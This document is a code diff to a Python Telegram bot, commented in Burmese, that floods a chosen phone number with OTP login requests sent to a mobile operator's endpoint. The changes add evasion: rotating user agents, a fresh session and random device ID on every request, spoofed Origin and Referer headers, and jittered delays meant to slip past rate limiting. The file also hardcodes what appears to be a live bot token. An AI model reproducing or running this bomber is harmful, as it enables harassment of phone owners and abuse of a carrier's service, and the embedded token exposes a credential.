@@ -3,6 +3,8 @@ from telebot import types
 import requests
 import time
 import threading
+import random
+import uuid
 
 # Bot Token ကို တိုက်ရိုက်ထည့်သွင်းထားပါသည်
 TOKEN = '8183997269:AAElovxXFRd40oatzEtSnKpVm8UAheNvAQw'
@@ -51,6 +53,7 @@ def start_bombing(message):
 
     bot.reply_to(message, f"🚀 စတင်နေပါပြီ...\n📱 ဖုန်းနံပါတ်: `{phone_number}`\n🔄 အကြိမ်ရေ: `{count}` ကြိမ်", parse_mode="Markdown", reply_markup=markup)
 
+    # Thread စတင်ပြီး နောက်ကွယ်မှာ အသစ်တောင်းသလို Auto ဆက်တိုက် လုပ်ဆောင်စေခြင်း
     threading.Thread(target=run_bomber, args=(message.chat.id, phone_number, count)).start()
 
 def run_bomber(chat_id, phone_number, count):
@@ -58,22 +61,49 @@ def run_bomber(chat_id, phone_number, count):
     fail_count = 0
 
     url = f"{BASE_URL}/user/loginOtp"
-    payload = {"msisdn": phone_number}
+
+    user_agents = [
+        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
+    ]
 
     for i in range(count):
         try:
-            response = requests.post(url, json=payload, timeout=10)
-            data = response.json()
-            status = str(data.get("status", ""))
+            # တခါတောင်းတိုင်းမှာ Session အသစ် (Fresh Request) တစ်ခုဖြစ်အောင် 
+            # ပြီးတော့ ပထမဆုံးအကြိမ် တောင်းသလိုမျိုး သီးသန့် Session Connection အသုံးပြုခြင်း
+            session = requests.Session()
             
-            if status in ["200", "00000"]:
+            device_id = str(uuid.uuid4())
+            
+            headers = {
+                "User-Agent": random.choice(user_agents),
+                "Content-Type": "application/json",
+                "Accept": "application/json, text/plain, */*",
+                "X-Request-ID": device_id,
+                "X-Device-Id": device_id,
+                "Origin": "https://mytel.bubblepop.info",
+                "Referer": "https://mytel.bubblepop.info/"
+            }
+            
+            payload = {
+                "msisdn": phone_number,
+                "uuid": device_id
+            }
+            
+            # Request အသစ်စက်စက် ပို့ဆောင်ခြင်း
+            response = session.post(url, json=payload, headers=headers, timeout=10)
+            
+            if response.status_code == 200:
                 success_count += 1
             else:
                 fail_count += 1
-        except Exception:
+                
+        except Exception as e:
             fail_count += 1
         
-        time.sleep(1)
+        # တစ်ကြိမ်နဲ့တစ်ကြိမ် ကြားထဲမှာ ချက်ချင်းကြီး မသွားဘဲ သဘာဝကျကျ အနည်းငယ် စောင့်ပေးခြင်း
+        time.sleep(random.uniform(2.0, 4.0))
 
     bot.send_message(chat_id, f"✅ **Bomber ပြီးဆုံးပါပြီ!**\n\n📱 ဖုန်းနံပါတ်: `{phone_number}`\n✨ အောင်မြင်မှု: `{success_count}` ကြိမ်\n❌ မှားယွင်းမှု: `{fail_count}` ကြိမ်", parse_mode="Markdown")
 
